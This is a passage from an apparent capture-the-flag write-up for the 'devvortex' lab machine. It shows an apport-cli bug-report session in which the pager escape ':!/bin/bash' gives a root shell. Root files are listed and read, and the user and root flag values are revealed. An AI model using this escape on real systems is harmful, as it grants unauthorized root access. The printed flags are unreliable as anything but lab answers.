  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

..dpkg-query: no packages found matching xorg
...............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
WARNING: terminal is not fully functional
-  (press RETURN)== ApportVersion =================================
2.20.11-0ubuntu27

== Architecture =================================
amd64

== CasperMD5CheckResult =================================
skip

== Date =================================
Sun Dec 24 18:45:15 2023

== DistroRelease =================================
Ubuntu 20.04

== Package =================================
xorg (not installed)

== ProblemType =================================
Bug

== ProcCpuinfoMinimal =================================
processor       : 1
:!/bin/bash
root@devvortex:/# whoami
root
root@devvortex:/# id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:/# ll /root
total 28
drwx------  4 root root 4096 Dec 24 10:20 ./
drwxr-xr-x 19 root root 4096 Oct 26 15:12 ../
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct 29 16:21 .cleanup/
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Dec 24 10:20 root.txt
drwx------  2 root root 4096 Oct 26 15:12 .ssh/
root@devvortex:/# cat /root/root.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### Flag Codes
??? question "**Reveal Flags** 🏁"
    #### **User Flag**
        2d53635a6796515373c356f327cca3fe
    #### **Root Flag**
        5362b402f0dccf1dc6f0288bcf145a97
        

---

#### *If this was helpful in someway, [you can **support me** by zapping me some sats](https://getalby.com/p/0xrh0d4m1n)!*
#### *See you in the next writeup!*
